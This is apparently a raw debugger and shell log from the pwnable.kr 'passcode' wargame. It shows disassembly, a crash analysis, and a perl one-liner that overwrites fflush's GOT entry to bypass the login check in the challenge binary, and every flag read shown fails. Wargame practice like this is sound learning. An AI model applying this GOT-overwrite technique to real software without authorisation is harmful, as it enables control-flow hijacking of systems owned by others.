@@ -1,0 +1,147 @@
+pwndbg> disass login
+Dump of assembler code for function login:
+   0x080491f6 <+0>:     push   ebp
+   0x080491f7 <+1>:     mov    ebp,esp
+   0x080491f9 <+3>:     push   esi
+   0x080491fa <+4>:     push   ebx
+   0x080491fb <+5>:     sub    esp,0x10
+   0x080491fe <+8>:     call   0x8049130 <__x86.get_pc_thunk.bx>
+   0x08049203 <+13>:    add    ebx,0x2dfd
+   0x08049209 <+19>:    sub    esp,0xc
+   0x0804920c <+22>:    lea    eax,[ebx-0x1ff8]
+   0x08049212 <+28>:    push   eax
+   0x08049213 <+29>:    call   0x8049050 <printf@plt>
+   0x08049218 <+34>:    add    esp,0x10
+   0x0804921b <+37>:    sub    esp,0x8
+   0x0804921e <+40>:    push   DWORD PTR [ebp-0x10]
+   0x08049221 <+43>:    lea    eax,[ebx-0x1fe5]
+   0x08049227 <+49>:    push   eax
+   0x08049228 <+50>:    call   0x80490d0 <__isoc99_scanf@plt>
+   0x0804922d <+55>:    add    esp,0x10
+   0x08049230 <+58>:    mov    eax,DWORD PTR [ebx-0x4]
+   0x08049236 <+64>:    mov    eax,DWORD PTR [eax]
+   0x08049238 <+66>:    sub    esp,0xc
+   0x0804923b <+69>:    push   eax
+   0x0804923c <+70>:    call   0x8049060 <fflush@plt>
+   0x08049241 <+75>:    add    esp,0x10
+   0x08049244 <+78>:    sub    esp,0xc
+   0x08049247 <+81>:    lea    eax,[ebx-0x1fe2]
+   0x0804924d <+87>:    push   eax
+   0x0804924e <+88>:    call   0x8049050 <printf@plt>
+   0x08049253 <+93>:    add    esp,0x10
+   0x08049256 <+96>:    sub    esp,0x8
+   0x08049259 <+99>:    push   DWORD PTR [ebp-0xc]
+   0x0804925c <+102>:   lea    eax,[ebx-0x1fe5]
+   0x08049262 <+108>:   push   eax
+   0x08049263 <+109>:   call   0x80490d0 <__isoc99_scanf@plt>
+   0x08049268 <+114>:   add    esp,0x10
+   0x0804926b <+117>:   sub    esp,0xc
+
+pwndbg> r
+Starting program: /home/passcode/passcode 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+Toddler's Secure Login System 1.1 beta.
+enter you name : 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456AAAA
+Welcome 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456AAAA!
+enter passcode1 : 333333
+
+Program received signal SIGSEGV, Segmentation fault.
+0xf7dcaf80 in __vfscanf_internal (s=<optimized out>, format=<optimized out>, argptr=<optimized out>, mode_flags=<optimized out>) at ./stdio-common/vfscanf-internal.c:1896
+1896    ./stdio-common/vfscanf-internal.c: No such file or directory.
+Disabling the emulation via Unicorn Engine that is used for computing branches as there isn't enough memory (1GB) to use it (since mmap(1G, RWX) failed). See also:
+* https://github.com/pwndbg/pwndbg/issues/1534
+* https://github.com/unicorn-engine/unicorn/pull/1743
+Either free your memory or explicitly set `set emulate off` in your Pwndbg config
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────
+ EAX  0x51615
+ EBX  0x40
+ ECX  0xffefca54 ◂— 0x41414141 ('AAAA')
+ EDX  0x41414141 ('AAAA')
+ EDI  0xffefca58 ◂— 0x34333231 ('1234')
+ ESI  7
+ EBP  0xffefca28 —▸ 0xffefca78 —▸ 0xffefca88 —▸ 0xf7fed020 (_rtld_global) —▸ 0xf7feda40 ◂— ...
+ ESP  0xffefc400 —▸ 0xf7f97da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
+ EIP  0xf7dcaf80 (__vfscanf_internal+19248) ◂— mov dword ptr [edx], eax
+─────────────────────────────────────────[ DISASM / i386 / set emulate off ]────────────────────
+
+0xf7dcaf82 <__vfscanf_internal+19250>    jmp    __vfscanf_internal+6419     <__vfscanf_internal+6419>
+    ↓
+   0xf7dc7d63 <__vfscanf_internal+6419>     add    dword ptr [ebp - 0x5d0], 1
+   0xf7dc7d6a <__vfscanf_internal+6426>     mov    ebx, dword ptr [ebp - 0x57c]
+   0xf7dc7d70 <__vfscanf_internal+6432>     jmp    __vfscanf_internal+636      <__vfscanf_internal+636>
+    ↓
+   0xf7dc66cc <__vfscanf_internal+636>      movzx  eax, byte ptr [ebx]
+   0xf7dc66cf <__vfscanf_internal+639>      test   al, al
+   0xf7dc66d1 <__vfscanf_internal+641>      jne    __vfscanf_internal+481      <__vfscanf_internal+481>
+ 
+   0xf7dc66d7 <__vfscanf_internal+647>      mov    eax, dword ptr [ebp - 0x5ac]
+   0xf7dc66dd <__vfscanf_internal+653>      test   eax, eax
+   0xf7dc66df <__vfscanf_internal+655>      je     __vfscanf_internal+1376     <__vfscanf_internal+1376>
+──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────
+00:0000│ esp 0xffefc400 —▸ 0xf7f97da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
+01:0004│-624 0xffefc404 —▸ 0x99ae1a0 ◂— 'enter passcode1 : 12345678901234567890123456789012345678901234567890123456789012345678901234567890123456AAAA!\n'
+02:0008│-620 0xffefc408 ◂— 0x6e /* 'n' */
+03:000c│-61c 0xffefc40c ◂— 0
+04:0010│-618 0xffefc410 —▸ 0xf7f2a264 ◂— 'to_inpunct'
+05:0014│-614 0xffefc414 ◂— 0x7d4
+06:0018│-610 0xffefc418 —▸ 0xf7f2ba68 (dot) ◂— 0x5750002e /* '.' */
+07:001c│-60c 0xffefc41c ◂— 0
+────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────
+ ► 0 0xf7dcaf80 __vfscanf_internal+19248
+   1 0xf7dc5c89 __isoc99_scanf+41
+   2 0x804922d login+55
+   3 0x804939a main+54
+   4 0xf7d8e519 __libc_start_call_main+121
+   5 0xf7d8e5f3 __libc_start_main+147
+   6 0x804910c _start+44
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/3i 0x8049060
+   0x8049060 <fflush@plt>:      jmp    DWORD PTR ds:0x804c014
+   0x8049066 <fflush@plt+6>:    push   0x10
+   0x804906b <fflush@plt+11>:   jmp    0x8049030
+pwndbg> q
+
+enter passcode1 : Now I can safely trust you that you have credential :)
+passcode@ubuntu:~$ (perl -e 'print "A" x 96 . "\x14\xc0\x04\x08" . "134517437";'; cat) | ./passcode
+Toddler's Secure Login System 1.1 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+
+/bin/cat: flag: Permission denied
+enter passcode1 : Now I can safely trust you that you have credential :)
+
+passcode@ubuntu:~$ ssh passcode@pwnable.kr -p2222
+The authenticity of host '[pwnable.kr]:2222 ([163.180.160.168]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:co5+kpA+iyzJvLo9hBPQhqvyLVyeR+R3FN7pFfVqSC4.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/home/passcode/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/home/passcode/.ssh/known_hosts).
+passcode@pwnable.kr's password: 
+██     ██ ███████ ██       ██████  ██████  ███    ███ ███████     ████████  ██████  
+██     ██ ██      ██      ██      ██    ██ ████  ████ ██             ██    ██    ██ 
+██  █  ██ █████   ██      ██      ██    ██ ██ ████ ██ █████          ██    ██    ██ 
+██ ███ ██ ██      ██      ██      ██    ██ ██  ██  ██ ██             ██    ██    ██ 
+ ███ ███  ███████ ███████  ██████  ██████  ██      ██ ███████        ██     ██████  
+                                                                                    
+                                                                                    
+██████  ██     ██ ███    ██  █████  ██████  ██      ███████    ██   ██ ██████       
+██   ██ ██     ██ ████   ██ ██   ██ ██   ██ ██      ██         ██  ██  ██   ██      
+██████  ██  █  ██ ██ ██  ██ ███████ ██████  ██      █████      █████   ██████       
+██      ██ ███ ██ ██  ██ ██ ██   ██ ██   ██ ██      ██         ██  ██  ██   ██      
+██       ███ ███  ██   ████ ██   ██ ██████  ███████ ███████ ██ ██   ██ ██   ██      
+                                                                                    
+
+Admin: daehee (daehee87@khu.ac.kr)
+Please note that server is under renewal/update.
+Please don't brute-force the resource, be kind to other users.
+Installed Tools: pwndbg, qemu, python2, python3
+(let admin know if some essential tool is missing)
+**IMPORTANT: stuff under /tmp can be erased. "/usr/local/bin/cleanup_tmp.sh" runs every 24H **
+passcode@ubuntu:~$ (perl -e 'print "A" x 96 . "\x14\xc0\x04\x08" . "134517437";') | ./passcode
+Toddler's Secure Login System 1.1 beta.
+enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
+/bin/cat: flag: Permission denied
+enter passcode1 : Now I can safely trust you that you have credential :)
+passcode@ubuntu:~$ 
